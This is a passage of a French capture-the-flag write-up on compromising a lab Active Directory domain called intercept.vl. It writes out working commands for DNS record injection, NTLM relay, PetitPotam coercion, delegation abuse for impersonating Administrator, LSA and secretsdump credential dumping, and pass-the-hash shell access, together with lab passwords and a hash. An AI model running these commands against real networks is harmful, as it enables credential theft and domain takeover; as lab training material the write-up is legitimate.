+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">4</span> <span class="nx">ous</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_ous.json created!
+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">1</span> <span class="nx">domains</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_domains.json created!
+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">2</span> <span class="nx">gpos</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_gpos.json created!
+</span></span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="mi">21</span> <span class="nx">containers</span> <span class="nx">parsed</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">19</span><span class="nx">T21</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span><span class="nx">Z</span> <span class="nx">INFO</span>  <span class="nx">rusthound</span><span class="o">::</span><span class="nx">json</span><span class="o">::</span><span class="nx">maker</span><span class="p">]</span> <span class="p">.</span><span class="c1">//20260119222137_intercept-vl_containers.json created!
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">RustHound</span> <span class="nx">Enumeration</span> <span class="nx">Completed</span> <span class="nx">at</span> <span class="mi">22</span><span class="o">:</span><span class="mi">21</span><span class="o">:</span><span class="mi">37</span> <span class="nx">on</span> <span class="mi">01</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">26</span><span class="o">!</span> <span class="nx">Happy</span> <span class="nx">Graphing</span><span class="o">!</span></span></span></code></pre></div></div>
+<p><code>Administrator</code> et <code>Rhys.King</code> sont les deux administrateurs du domaine.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-4.png"
+        data-srcset="/images/Intercept/Intercept-4.png, /images/Intercept/Intercept-4.png 1.5x, /images/Intercept/Intercept-4.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-4.png"
+        title="/images/Intercept/Intercept-4.png" width="820" height="491" /></p>
+<p><code>Vincent.Wood</code> possède les droits <code>WriteAccountRestrictions</code> sur la machine <strong>WS01</strong>. Ce qui signifie qu&rsquo;il peut modifier l&rsquo;attribut <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> de cette dernière lui permettant d&rsquo;effectuer une [RBCD](<a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" target="_blank" rel="noopener noreffer ">(RBCD) Resource-based constrained | The Hacker Recipes</a>).
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-5.png"
+        data-srcset="/images/Intercept/Intercept-5.png, /images/Intercept/Intercept-5.png 1.5x, /images/Intercept/Intercept-5.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-5.png"
+        title="/images/Intercept/Intercept-5.png" width="755" height="327" /></p>
+<p><code>Simon.Bowen</code> quant à lui est membre du groupe <strong>HELPDESK</strong> qui a le droit <code>GenericAll</code> sur le groupe <strong>CA-MANAGERS</strong> ainsi que l&rsquo;OU <strong>CA-MANAGERS</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-6.png"
+        data-srcset="/images/Intercept/Intercept-6.png, /images/Intercept/Intercept-6.png 1.5x, /images/Intercept/Intercept-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-6.png"
+        title="/images/Intercept/Intercept-6.png" width="828" height="535" /></p>
+<h2 id="ntlm-relay">NTLM Relay</h2>
+<p>Jusque là on a des scénarios d&rsquo;attaques mais on a pas encore compromis ces utilisateurs. Une chose que je décide alors de vérifier est la signature LDAP sur le <strong>DC01</strong>. Puisque jusque là on avait vu que la signature SMB était désactivé sur les deux machines.
+Donc avec <a href="https://github.com/zyn3rgy/LdapRelayScan" target="_blank" rel="noopener noreffer ">LdapRelayScan</a>, je vois que la signature ainsi que le <strong>binding</strong> LDAP sont désactivés sur le <code>DC01</code>. Je peux donc exploiter l&rsquo;attaque par <a href="https://www.thehacker.recipes/ad/movement/ntlm/relay#abuse" target="_blank" rel="noopener noreffer ">relais NTLM</a>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">LdapRelayScan</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="s2">&#34;10.13.38.49&#34;</span> <span class="o">-</span><span class="nx">method</span> <span class="nx">BOTH</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-7.png"
+        data-srcset="/images/Intercept/Intercept-7.png, /images/Intercept/Intercept-7.png 1.5x, /images/Intercept/Intercept-7.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-7.png"
+        title="/images/Intercept/Intercept-7.png" width="1438" height="342" /></p>
+<p>La première étape de cette attaque est de créer un enregistrement DNS sur le <strong>DC01</strong> pointant vers l&rsquo;adresse IP de ma machine attaquante.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">dnstool</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">u</span> <span class="s1">&#39;intercept.vl\Kathryn.Spencer&#39;</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">&#39;attacker.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">d</span> <span class="s1">&#39;10.10.16.9&#39;</span> <span class="o">--</span><span class="nx">action</span> <span class="nx">add</span> <span class="s1">&#39;dc01.intercept.vl&#39;</span> <span class="o">-</span><span class="nx">dns</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-8.png"
+        data-srcset="/images/Intercept/Intercept-8.png, /images/Intercept/Intercept-8.png 1.5x, /images/Intercept/Intercept-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-8.png"
+        title="/images/Intercept/Intercept-8.png" width="1747" height="215" /></p>
+<p>J&rsquo;ajoute ensuite la ligne <code>nameserver 10.13.38.49</code> dans le fichier <code>/etc/resolv.conf</code> de ma machine.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-9.png"
+        data-srcset="/images/Intercept/Intercept-9.png, /images/Intercept/Intercept-9.png 1.5x, /images/Intercept/Intercept-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-9.png"
+        title="/images/Intercept/Intercept-9.png" width="442" height="113" /></p>
+<p>Avec <code>nslookup</code>, je vois que la résolution vers <code>attacker.intercept.vl</code> pointe bien vers mon adresse IP.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">nslookup</span> <span class="nx">attacker</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="nx">dc01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-10.png"
+        data-srcset="/images/Intercept/Intercept-10.png, /images/Intercept/Intercept-10.png 1.5x, /images/Intercept/Intercept-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-10.png"
+        title="/images/Intercept/Intercept-10.png" width="627" height="212" /></p>
+<p>J&rsquo;utilise alors le module <code>coerce_plus</code> de <strong>netexec</strong> pour voir à quel scénario cette machine est vulnérable.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">Chocolate1</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">coerce_plus</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="mi">2022</span> <span class="nx">Build</span> <span class="mi">20348</span> <span class="nx">x64</span> <span class="p">(</span><span class="nx">name</span><span class="o">:</span><span class="nx">DC01</span><span class="p">)</span> <span class="p">(</span><span class="nx">domain</span><span class="o">:</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="p">)</span> <span class="p">(</span><span class="nx">signing</span><span class="o">:</span><span class="nx">True</span><span class="p">)</span> <span class="p">(</span><span class="nx">SMBv1</span><span class="o">:</span><span class="nx">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SMB</span>         <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">\</span><span class="nx">Kathryn</span><span class="p">.</span><span class="nx">Spencer</span><span class="o">:</span><span class="nx">Chocolate1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">COERCE_PLUS</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="nx">VULNERABLE</span><span class="p">,</span> <span class="nx">DFSCoerce</span>
+</span></span><span class="line"><span class="cl"><span class="nx">COERCE_PLUS</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="nx">VULNERABLE</span><span class="p">,</span> <span class="nx">PetitPotam</span>
+</span></span><span class="line"><span class="cl"><span class="nx">COERCE_PLUS</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="nx">VULNERABLE</span><span class="p">,</span> <span class="nx">PrinterBug</span>
+</span></span><span class="line"><span class="cl"><span class="nx">COERCE_PLUS</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="nx">VULNERABLE</span><span class="p">,</span> <span class="nx">PrinterBug</span>
+</span></span><span class="line"><span class="cl"><span class="nx">COERCE_PLUS</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span>     <span class="mi">445</span>    <span class="nx">DC01</span>             <span class="nx">VULNERABLE</span><span class="p">,</span> <span class="nx">MSEven</span></span></span></code></pre></div></div>
+<p>Ensuite avec <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py" target="_blank" rel="noopener noreffer ">ntlmrelayx</a>, j&rsquo;écoute les connexions NTLM entrantes. Je l&rsquo;utilise avec les options suivantes :</p>
+<ul>
+<li><strong><code>-t ldaps://dc01.intercept.vl</code></strong> : pour relayer l&rsquo;authentification NTLM vers ce serveur LDAPS <code>dc01.intercept.vl</code>.</li>
+<li><strong><code>--delegate-access</code></strong> : Si le relais réussit, active la <a href="https://beta.hackndo.com/constrained-unconstrained-delegation/#kerberos-constrained-delegation" target="_blank" rel="noopener noreffer ">délégation contrainte</a> pour l&rsquo;utilisateur relayé, permettant des attaques avancées comme l&rsquo;accès à d&rsquo;autres services.</li>
+<li><strong><code>-smb2support</code></strong> : Active le support SMBv2 pour une compatibilité accrue avec les clients modernes.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ntlmrelayx.py -t ldaps://dc01.intercept.vl --delegate-access -smb2support</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-11.png"
+        data-srcset="/images/Intercept/Intercept-11.png, /images/Intercept/Intercept-11.png 1.5x, /images/Intercept/Intercept-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-11.png"
+        title="/images/Intercept/Intercept-11.png" width="1143" height="566" /></p>
+<p>J&rsquo;utilise ensuite <code>PetitPotam</code> pour forcer une authentification depuis <code>WS01</code> vers notre relais. L&rsquo;attaque a fonctionné.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">petitpotam</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">d</span> <span class="s2">&#34;intercept.vl&#34;</span> <span class="o">-</span><span class="nx">u</span> <span class="s2">&#34;Kathryn.Spencer&#34;</span> <span class="o">-</span><span class="nx">p</span> <span class="s2">&#34;Chocolate1&#34;</span> <span class="nx">attacker</span><span class="err">@</span><span class="mi">80</span><span class="o">/</span><span class="nx">aaa</span> <span class="s2">&#34;ws01.intercept.vl&#34;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-12.png"
+        data-srcset="/images/Intercept/Intercept-12.png, /images/Intercept/Intercept-12.png 1.5x, /images/Intercept/Intercept-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-12.png"
+        title="/images/Intercept/Intercept-12.png" width="757" height="323" /></p>
+<p>Cela a donc créé un compte machine qui peut <strong>usurper l&rsquo;identité de n&rsquo;importe quel utilisateur</strong> sur la machine <strong>WS01</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-13.png"
+        data-srcset="/images/Intercept/Intercept-13.png, /images/Intercept/Intercept-13.png 1.5x, /images/Intercept/Intercept-13.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-13.png"
+        title="/images/Intercept/Intercept-13.png" width="1075" height="410" /></p>
+<p>Je demande alors un TGT en tant que l&rsquo;utilisateur <code>Administrator</code> local de <strong>WS01</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">getST</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">spn</span> <span class="nx">HOST</span><span class="o">/</span><span class="nx">WS01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="s1">&#39;intercept.vl/FVUMYYRJ$:UJ3fd-z7m{Ft&gt;Yf&#39;</span> <span class="o">-</span><span class="nx">dc</span><span class="o">-</span><span class="nx">ip</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span> <span class="o">-</span><span class="nx">impersonate</span> <span class="nx">Administrator</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-14.png"
+        data-srcset="/images/Intercept/Intercept-14.png, /images/Intercept/Intercept-14.png 1.5x, /images/Intercept/Intercept-14.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-14.png"
+        title="/images/Intercept/Intercept-14.png" width="1427" height="260" /></p>
+<p>J&rsquo;exporte ce ticket dans la variable <strong><code>KRB5CCNAME</code></strong> et je vois que le ticket est bien valide.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">export</span> <span class="nx">KRB5CCNAME</span><span class="o">=</span><span class="nx">Administrator</span><span class="err">@</span><span class="nx">HOST_WS01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span><span class="err">@</span><span class="nx">INTERCEPT</span><span class="p">.</span><span class="nx">VL</span><span class="p">.</span><span class="nx">ccache</span>
+</span></span><span class="line"><span class="cl"><span class="nx">nxc</span> <span class="nx">smb</span> <span class="nx">ws01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">--</span><span class="nx">use</span><span class="o">-</span><span class="nx">kcache</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-16.png"
+        data-srcset="/images/Intercept/Intercept-16.png, /images/Intercept/Intercept-16.png 1.5x, /images/Intercept/Intercept-16.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-16.png"
+        title="/images/Intercept/Intercept-16.png" width="1198" height="233" /></p>
+<p>Je dump la LSA et je trouve alors les identifiants de <code>Simon.Bowel</code>. La LSA est un <strong>composant central de sécurité dans Windows</strong> qui gère <strong>l’authentification des utilisateurs et les secrets de sécurité du système</strong>.
+Elle garde certains <strong>secrets sensibles</strong>, appelés <strong>LSA secrets</strong>, par exemple :</p>
+<ul>
+<li>les mots de passe de comptes de services</li>
+<li>les identifiants de tâches planifiées</li>
+<li>les clés utilisées par certains services</li>
+<li>les informations de domaine mises en cache</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">nxc</span> <span class="nx">smb</span> <span class="nx">ws01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">--</span><span class="nx">use</span><span class="o">-</span><span class="nx">kcache</span> <span class="o">--</span><span class="nx">lsa</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-15.png"
+        data-srcset="/images/Intercept/Intercept-15.png, /images/Intercept/Intercept-15.png 1.5x, /images/Intercept/Intercept-15.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-15.png"
+        title="/images/Intercept/Intercept-15.png" width="1896" height="485" /></p>
+<p>Je peux aussi dumper tous les hash et mot de passe avec <code>secretsdump</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">secretsdump</span> <span class="nx">ws01</span><span class="p">.</span><span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">k</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-17.png"
+        data-srcset="/images/Intercept/Intercept-17.png, /images/Intercept/Intercept-17.png 1.5x, /images/Intercept/Intercept-17.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-17.png"
+        title="/images/Intercept/Intercept-17.png" width="996" height="757" /></p>
+<h2 id="shell-on-ws01">Shell on WS01</h2>
+<p>Récupération du flag <code>Intercept Master</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">evil-winrm -u Administrator -H 831cbc509daa37aff98250b635e7f482 -i ws01.intercept.vl</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-18.png"
+        data-srcset="/images/Intercept/Intercept-18.png, /images/Intercept/Intercept-18.png 1.5x, /images/Intercept/Intercept-18.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-18.png"
+        title="/images/Intercept/Intercept-18.png" width="743" height="115" /></p>
+<h1 id="shell-as-administrator">Shell as Administrator</h1>
+<p>Les identifiants trouvés sont valides
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-19.png"
+        data-srcset="/images/Intercept/Intercept-19.png, /images/Intercept/Intercept-19.png 1.5x, /images/Intercept/Intercept-19.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-19.png"
+        title="/images/Intercept/Intercept-19.png" width="1720" height="132" /></p>
+<p><code>Simon.Bowen</code> est membre du groupe <strong>HELPDESK</strong> qui a le droit <code>GenericAll</code> sur le groupe <strong>CA-MANAGERS</strong> ainsi que l&rsquo;OU <strong>CA-MANAGERS</strong>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Intercept/Intercept-6.png"
+        data-srcset="/images/Intercept/Intercept-6.png, /images/Intercept/Intercept-6.png 1.5x, /images/Intercept/Intercept-6.png 2x"
+        data-sizes="auto"
+        alt="/images/Intercept/Intercept-6.png"
+        title="/images/Intercept/Intercept-6.png" width="828" height="535" /></p>
+<h2 id="add-simonbowen-to-ca-managers">Add Simon.Bowen to CA-MANAGERS</h2>
+<p>J&rsquo;ajoute <code>Simon.Bowen</code> au groupe <code>CA-MANAGERS</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-js">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">[</span><span class="nx">root</span><span class="err">@</span><span class="nx">exegol</span><span class="o">-</span><span class="nx">intercept</span><span class="p">]</span> <span class="o">/</span><span class="nx">workspace</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">bloodyAD</span> <span class="o">--</span><span class="nx">host</span> <span class="mf">10.13</span><span class="p">.</span><span class="mf">38.49</span> <span class="o">-</span><span class="nx">d</span> <span class="nx">intercept</span><span class="p">.</span><span class="nx">vl</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span> <span class="o">-</span><span class="nx">p</span> <span class="s1">&#39;b0OI_fHO859+Aw&#39;</span> <span class="nx">add</span> <span class="nx">groupMember</span> <span class="nx">CA</span><span class="o">-</span><span class="nx">MANAGERS</span> <span class="nx">Simon</span><span class="p">.</span><span class="nx">Bowen</span>
